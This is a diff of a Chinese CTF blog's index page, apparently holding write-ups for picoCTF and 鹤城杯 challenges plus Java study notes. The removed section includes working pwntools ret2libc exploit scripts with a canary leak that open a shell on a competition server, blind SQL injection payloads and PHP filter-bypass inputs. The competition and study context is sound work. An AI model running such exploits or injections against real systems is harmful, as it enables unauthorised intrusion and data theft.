&#123;</span><br><span class="line">                    highlight_file(&quot;index.php&quot;);</span><br><span class="line">                    die();</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    echo &quot;MD5 hashes do not match!&quot;;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Files are not different!&quot;;</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Not a PDF!&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;File too large!&quot;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; FLAG: picoCTF&#123;c0ngr4ts_u_r_1nv1t3d_aebcbf39&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;It is my Birthday&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.2.0&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;getbootstrap.com&#x2F;docs&#x2F;3.3&#x2F;examples&#x2F;jumbotron-narrow&#x2F;jumbotron-narrow.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">            &lt;h3 class&#x3D;&quot;text-muted&quot;&gt;It is my Birthday&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;jumbotron&quot;&gt;</span><br><span class="line">            &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;See if you are invited to my party!&lt;&#x2F;h3&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;br&#x2F;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;upload-form&quot;&gt;</span><br><span class="line">                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;&#x2F;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; id&#x3D;&quot;file1&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; id&#x3D;&quot;file2&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-lg btn-success btn-block&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;footer class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">        &lt;p&gt;&amp;copy; PicoCTF&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;footer&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(document).ready(function()&#123;</span><br><span class="line">    $(&quot;.close&quot;).click(function()&#123;</span><br><span class="line">        $(&quot;myAlert&quot;).alert(&quot;close&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Who are you?<br>打开以后是一句话：Only people who use the official PicoBrowser are allowed on this site!<br>看来是检测浏览器信息了，应该是查的header的User-Agent，改成PicoBrowser就好<br>发现I don’t trust users visiting from another site.<br>那估计是referer吧，改成它自己的网址<br>发现Sorry, this site only worked in 2018.<br>Date参数2018<br>回：I don’t trust users who can be tracked.<br>DNT:dnt<br>回：This website is only for people from Sweden.<br>需要瑞典的ip，xff，找个ip填上去<br>回：You’re in Sweden but you don’t speak Swedish?<br>改Accept-Language:sv<br>拿到flag<br>感想：我那次出的还是保守了</p>
+<p>login<br>又一个login<br>试出来admin是账号，但是似乎没法注释，以这个网站的尿性，应该不是sql，查看源码，发现js：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(async()&#x3D;&gt;&#123;await new Promise((e&#x3D;&gt;window.addEventListener(&quot;load&quot;,e))),document.querySelector(&quot;form&quot;).addEventListener(&quot;submit&quot;,(e&#x3D;&gt;&#123;e.preventDefault();const r&#x3D;&#123;u:&quot;input[name&#x3D;username]&quot;,p:&quot;input[name&#x3D;password]&quot;&#125;,t&#x3D;&#123;&#125;;for(const e in r)t[e]&#x3D;btoa(document.querySelector(r[e]).value).replace(&#x2F;&#x3D;&#x2F;g,&quot;&quot;);return&quot;YWRtaW4&quot;!&#x3D;&#x3D;t.u?alert(&quot;Incorrect Username&quot;):&quot;cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ&quot;!&#x3D;&#x3D;t.p?alert(&quot;Incorrect Password&quot;):void alert(&#96;Correct Password! Your flag is $&#123;atob(t.p)&#125;.&#96;)&#125;))&#125;)();</span><br></pre></td></tr></table></figure>
+<p>用sublime排一下版：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(async () &#x3D;&gt; &#123;</span><br><span class="line">	await new Promise((e &#x3D;&gt; window.addEventListener(&quot;load&quot;, e))), document.querySelector(&quot;form&quot;).addEventListener(&quot;submit&quot;, (e &#x3D;&gt; &#123;</span><br><span class="line">		e.preventDefault();</span><br><span class="line">		const r &#x3D; &#123;</span><br><span class="line">				u: &quot;input[name&#x3D;username]&quot;,</span><br><span class="line">				p: &quot;input[name&#x3D;password]&quot;</span><br><span class="line">			&#125;,</span><br><span class="line">			t &#x3D; &#123;&#125;;</span><br><span class="line">		for (const e in r) t[e] &#x3D; btoa(document.querySelector(r[e]).value).replace(&#x2F;&#x3D;&#x2F;g, &quot;&quot;);</span><br><span class="line">		return &quot;YWRtaW4&quot; !&#x3D;&#x3D; t.u ? alert(&quot;Incorrect Username&quot;) : &quot;cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ&quot; !&#x3D;&#x3D; t.p ? alert(&quot;Incorrect Password&quot;) : void alert(&#96;Correct Password! Your flag is $&#123;atob(t.p)&#125;.&#96;)</span><br><span class="line">	&#125;))</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>因为一开始爆出了admin，用base64加密后是YWRtaW4=，和对比的正好差一个=<br>发现貌似会base64加密后把=给去掉<br>本以为后面那个要试着加=，但是好像直接解码就出结果了</p>
 
       
 
@@ -823,597 +1345,9 @@
     </section>
   
   
-    <article id="post-Java笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/10/Java%E7%AC%94%E8%AE%B0/">Java笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/01/10/Java%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2022-01-10T05:31:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>复习：</p>
-<p>Java三大版本<br>JavaSE：标准版（桌面程序，控制台开发……）（入门）<br>JavaME：嵌入式开发（手机，小家电）（几乎没人用了）<br>JavaEE：E级企业级开发（web端，服务器开发）</p>
-<p>JDK：开发<br>JRE：运行环境<br>JVM：java虚拟机<br>JDK包含JRE，JRE包含JVM</p>
-<p>java文件：<br>文件后缀<code>.java</code></p>
-<p>编译命令：<br><code>javac Hello.java</code><br>(生成Hello.class文件)</p>
-<p>运行Hello.class文件：<br><code>java Hello</code></p>
-<p>第一个java程序：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Hello&#123;</span><br><span class="line">	public static void main(String[] args)&#123;</span><br><span class="line">		System.out.print(&quot;Hello,world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>注意：<br>1.大小写敏感<br>2.尽量用英文<br>3.文件名和类名一致</p>
-<p>语言分类：<br>编译型<br>解释型<br>(区别（我的理解)：编译型就是先编译成可执行文件，然后运行文件（如c），解释型就是根据程序直接运行（如python），解释型更方便但是浪费运算，java两种都可以）</p>
-<p>idea：<br>创建后在src文件夹后写代码<br>打上psvm回车会自动生成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args)&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<p>sout –&gt; <code>System.out.println();</code></p>
-<p>语法：<br>1.注释：<br><code>//</code> <code>/* */</code><br>有趣的代码注释：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ydk888888/article/details/81563608">https://blog.csdn.net/ydk888888/article/details/81563608</a></p>
-<p>2.标识符：</p>
-<img src="/2022/01/10/Java%E7%AC%94%E8%AE%B0/1.PNG" class="" title="1.PNG">
-<p>（只能字母、美元符、下划线开头，不能作为方法名，大小写敏感）<br>（不能用数字开头，但神奇的是，竟然能用中文开头做变量名！包括类名。感觉可以利用这个特性搞死外国程序员……）</p>
-<p>3.数据类型：<br>（强类型语言）<br>基本数据类型：<br>byte<br>soert<br>int<br>long<br>float<br>double<br>char<br>boolean （true或false，不能用数字，默认false）<br>引用数据类型：<br>类<br>接口<br>数组</p>
-<p>4.类型转换<br>容量：低—————&gt;高<br>byte,short,char-&gt;int-&gt;long-&gt;float-&gt;double</p>
-<p>强制类型转换（高-&gt;低）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i&#x3D;128;</span><br><span class="line">byte b&#x3D;(byte)i; &#x2F;&#x2F;内存溢出</span><br></pre></td></tr></table></figure>
-<p>自动转换（低-&gt;高）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int i&#x3D;128;</span><br><span class="line">double b&#x3D;i; &#x2F;&#x2F;内存溢出</span><br></pre></td></tr></table></figure>
-<p>注意：<br>1.不能对bool值进行转换<br>2.不能转换成不相干的类型<br>3.可能遇到内存溢出和精度问题</p>
-<p>static 类变量<br>final 常量，不允许改变（只能赋值一次）</p>
-<p>运算符：<br>主要注意位运算符的用法（逻辑）</p>
-<p>Math库运用例：<br>Math.abs(); //绝对值</p>
-<p>包机制：<br>package（放到最上面）<br>路径<br>package后面的是src下面到当前文件所在文件夹的路径<br>语法格式：<br><code>package pkg1[．pkg2[．pkg3…]];</code><br>如</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">package net.java.util;</span><br><span class="line">public class Something&#123;</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>的路径为net/java/util/Something.java</p>
-<p>导入包：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（可以用通配符&#96;&#96;&#96;*&#96;&#96;&#96;来导入某个包中的所有文件）</span><br><span class="line"></span><br><span class="line">认真看阿里巴巴java开发手册！</span><br><span class="line"></span><br><span class="line">javadoc（生成api文档，可以看用了哪些方法）（暂时略过了）</span><br><span class="line"></span><br><span class="line">流程控制：</span><br><span class="line">输入：</span><br></pre></td></tr></table></figure>
-<p>Scanner s=new Scanner(System.in);<br>        if(s.hasNext()){ //判断是否有输入，也可以使用s.hasNextLine()<br>            String str=s.next(); //获取下一串字符串（到空格等截止），也可以使用s.nextLine()，接收一整行<br>            System.out.println(str); //输出字符串<br>        }<br>s.close() //用完关掉，节约空间</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">next():</span><br><span class="line">1.读取到有效字符才会结束输入</span><br><span class="line">2.自动去掉前面的空格</span><br><span class="line">3.到空格和结束符结束</span><br><span class="line">nextLine():</span><br><span class="line">1.以回车为结束符</span><br><span class="line">2.可以获得空白</span><br><span class="line">hasNextInt():</span><br><span class="line">判断后续还有没有整数（也可以判断别的类型）</span><br><span class="line">int f&#x3D;s.nextInt():</span><br><span class="line">接收整数</span><br><span class="line"></span><br><span class="line">if&#x2F;while&#x2F;dowhile&#x2F;for&#x2F;break&#x2F;continue和c++一样</span><br><span class="line">for有个补充：</span><br><span class="line">遍历数组</span><br><span class="line">&#96;&#96;&#96;for(int number:numbers)&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">方法：</span><br><span class="line">&#96;&#96;&#96;System.out.ptintln()&#96;&#96;&#96;(类.对象.方法)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;public static int add(int a,int b)&#123;&#125;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">命令行传参</span><br><span class="line">&#96;&#96;&#96;args.length&#96;&#96;&#96;传入字符串数量</span><br></pre></td></tr></table></figure>
-<p>public static void main(String[] args) {<br>        for(int i=0;i&lt;args.length;i++){<br>            System.out.println(args[i]);<br>        }<br>    }</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可变参数：</span><br><span class="line">在方法声明中，在指定参数类型后加三个点(...),只能在最后一个参数</span><br><span class="line"></span><br><span class="line">数组：</span><br></pre></td></tr></table></figure>
-<p>dataType[] array; //首选方法,dataType可为int等<br>//或dataType array[]; //效果相同不首选<br>//还需要定义大小（分配空间)<br>dataType[] array = new dataType[arraysize];<br>array.lenth //求数组长度<br>//给数组赋值<br>array[1]=1</p>
-<p>```<br>多维数组<br>int[][] array;</p>
-<p>arrays类：<br>导入：<code>import java.util.Arrays;</code><br>各种数组操作的类<br>如Arrays.tostring() :将数组转换为字符串</p>
-<p>面向对象：<br>（面向对象编程（OOP），面向对象（OO））<br>封装<br>继承<br>多态</p>
-<p>定义方法<br><code>public String hello()&#123;&#125;</code></p>
-<p>继承<br><code>extents</code></p>
-<p><code>super</code>(访问父类的属性)<br><code>this</code>(访问类中的变量，如果什么都不加就是访问方法里的变量)</p>
-<p>instanceof(类型转换)（判断两个类之间是否存在父子关系）</p>
-<p>abstract(抽象类)（只能被继承，不能实例化）</p>
-<p>接口：专业的约束，约束和现实分离：面向接口编程<br>interface （取代class）<br>类实现接口 implements</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/10/Java%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-鹤城杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">鹤城杯</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/" class="archive-article-date">
-  	<time datetime="2021-10-09T03:21:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第一次以团队形式参赛，全大二队伍拿到96名成绩还可以<br>贡献不大，全靠队友带飞</p>
-<p>babyof payload<br>基本的ropgadget<br>from pwn import *<br>from LibcSearcher import *</p>
-<p>#io = process(‘./babyof’)<br>io = remote(‘182.116.62.85’, 21613)<br>elf = ELF(‘./babyof’)<br>context.log_level = ‘debug’</p>
-<p>pop_rdi_ret = 0x400743<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x400632</p>
-<p>payload = b’a’*(0x40 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload)</p>
-<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
-<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
-<p>ret = 0x400506<br>payload2 = b’a’*(0x40+8)<br>payload2 += p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
-<p>io.sendline(payload2)<br>io.interactive()</p>
-<p>flag{89b55977-566c-431d-9034-74e7c181f340}</p>
-<p>littleof payload<br>多一个canary读取，和上题基本一样<br>from pwn import *<br>from LibcSearcher import *</p>
-<p>io = remote(‘182.116.62.85’, 27056)<br>#io = process(‘./littleof’)<br>elf = ELF(‘./littleof’)<br>context.log_level = ‘debug’</p>
-<p>pop_rdi_ret = 0x400863<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x4006e2</p>
-<p>payload1 = b’a’ * (0x50 - 8)<br>io.recv()<br>io.sendline(payload1)<br>io.recvuntil(payload1)<br>canary = u64(io.recv(8)) - 0xa<br>print(hex(canary))</p>
-<p>payload2 = payload1 + p64(canary) + p64(1) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload2)</p>
-<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
-<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
-<p>io.sendline(b’1’)<br>io.recv()</p>
-<p>ret = 0x40059e<br>payload3 = payload1 + p64(canary) + p64(1) + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
-<p>io.sendline(payload3)<br>io.interactive()</p>
-<p>flag{25e96197d4da10748a055753b5104856}</p>
-<p>easy_crytpo<br>签到题，联想到社会主义核心价值观编码，网上找到在线解码器<br>flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}</p>
-<p>A_crytpo<br>根据flag长度分析得出可能是四位一组的分组编码，并且前二十位可能是<br>4O59：f<br>5954：l<br>494Q：a<br>3251：g<br>5046：{<br>md，我太菜了！</p>
-<p>WEB MIDDLE_MAGIC<br>level1绕过<br>$aaa = preg_replace(‘/^(.<em>)level(.</em>)$/‘, ‘${1}<!-- filtered -->${2}’, $_GET[‘aaa’]);<br>任意匹配不包括%0a,#需要url编码%23表示<br>aaa=%0apass_the_level_1%23<br>level2<br>sha1绕过，sha1不能对数组加密，返回值都是NULL<br>admin[]=1&amp;root_pwd=2<br>level3<br>json绕过<br>在json中0对应任意字符串<br>level_3 = {“result”:0}<br>flag{f03d41bf6c8d55f12324fd57f7a00427}</p>
-<p>NEW_MISC<br>下载下来是一个pdf文件<br>010打开，发现20/09 16进制对<br>怀疑pdf隐写，wbStego跑一下<br>flag{verY_g00d_YoU_f0und_th1s}</p>
-<p>MISC2<br>下载了一副图片<br>经检查，无隐写，无crc修改<br>放入stegsolve，点点点<br>发现有lsb，将字符串提取出来，发现是NCR转义，将其化为ascii，得<br>flag{h0w_4bouT_enc0de_4nd_pnG}</p>
-<p>easysql2</p>
-<p>xdm可以试试盲注<br>username error 和 passwd error</p>
-<p>数据库名ctf<br>用’and%0a(ascii(substr(version(),1,1))&gt;1)#爆一下版本号<br>版本号为8.0.4<br>使用最新的sql特性注入<br>admin’and/<strong>/(‘def’,’a’,3,4,5,6)&lt;=(table/</strong>/information_schema.TABLE_CONSTRAINTS/<strong>/limit/</strong>/317,1)#</p>
-<p>EASYP<br>题目：<br>&lt;?php<br>include ‘utils.php’;</p>
-<p>if (isset($_POST[‘guess’])) {<br>    $guess = (string) $_POST[‘guess’];<br>    if ($guess === $secret) {<br>        $message = ‘Congratulations! The flag is: ‘ . $flag;<br>    } else {<br>        $message = ‘Wrong. Try Again’;<br>    }<br>}</p>
-<p>if (preg_match(‘/utils.php/*$/i’, $_SERVER[‘PHP_SELF’])) {<br>    exit(“hacker :)”);<br>}</p>
-<p>if (preg_match(‘/show_source/‘, $_SERVER[‘REQUEST_URI’])){<br>    exit(“hacker :)”);<br>}</p>
-<p>if (isset($_GET[‘show_source’])) {<br>    highlight_file(basename($_SERVER[‘PHP_SELF’]));<br>    exit();<br>}else{<br>    show_source(<strong>FILE</strong>);<br>}<br>?&gt;</p>
-<p>脚本：<br>import requests</p>
-<p>for i in range(0,255):</p>
-<pre><code>j=hex(i)[2:]
-print(j)
-url = &#39;http://182.116.62.85:21895/index.php/utils.php/%&#39;+ j + &#39;?show%20source=1&#39;
-#http://182.116.62.85:21895/?show%20source=1
-r = requests.get(url)
-if &#39;flag&#123;&#39; in r.text:
-    print(r.text)
-    break
-</code></pre>
-<p>$_SERVER[‘REQUEST_URI’]会把特殊字符（如空格）转换成下划线<br>$secret需要爆破，所以有了j<br>basename() 函数返回路径中的文件名部分，$_SERVER[‘PHP_SELF’]返回当前执行脚本的文件名。<br>传入<a target="_blank" rel="noopener" href="http://182.116.62.85:21895/index.php/utils.php">http://182.116.62.85:21895/index.php/utils.php</a> 时，$_SERVER[‘PHP_SELF’]会返回index.php/utils.php，而basename()会返回utils.php。这样我们再加上?show%20source=1就可以让highlight_file显示utils.php，而flag就在里面。<br>flag{bsyxmK7ncU5nPjsGMckFo8kgq95qRasg}</p>
-<p>流量分析<br>手工分析<br>首先进行数据包筛选<br>发现是一道sql注入的数据包</p>
-<p>根据数据包回包中字符长度不一样的部分，取出其中的ascii码，转换成flag<br>1 102  f<br>2 108 l<br>3 97<br>4 103<br>5 123<br>6 119<br>7 49<br>8 114<br>9 101<br>10 115<br>11 104<br>12 65<br>13 82<br>14 75<br>15 95<br>16 101<br>17 122<br>18 95<br>19 49<br>20 115<br>21 110<br>22 116<br>23 105<br>24 116<br>25 125<br>26 33<br>flag{w1reshARK_ez_1sntit}</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-ctfmanage" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/07/ctfmanage/">ctfmanage</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/10/07/ctfmanage/" class="archive-article-date">
-  	<time datetime="2021-10-07T14:29:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="ctfmanage"><a href="#ctfmanage" class="headerlink" title="ctfmanage"></a>ctfmanage</h3><p>转载自qq群<code>。</code>大佬发的md文件</p>
-<ul>
-<li>打开题目是一个登录框，加上字母发现直接报错，发现使用的是登录号，所以登录名是一个数字型参数，没有单引号包裹，而密码是一个字符型参数（所以注入点在用户名，密码随便填一个防止因为内容为空脚本验证不通过）：</li>
-</ul>
-<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318191.png" alt="image-20211002022340742" style="zoom:50%;" />
-
-<ul>
-<li>尝试输入用户名<code>1 or 1=1#</code>，发现被过滤，使用fuzz字典跑一下过滤值：</li>
-</ul>
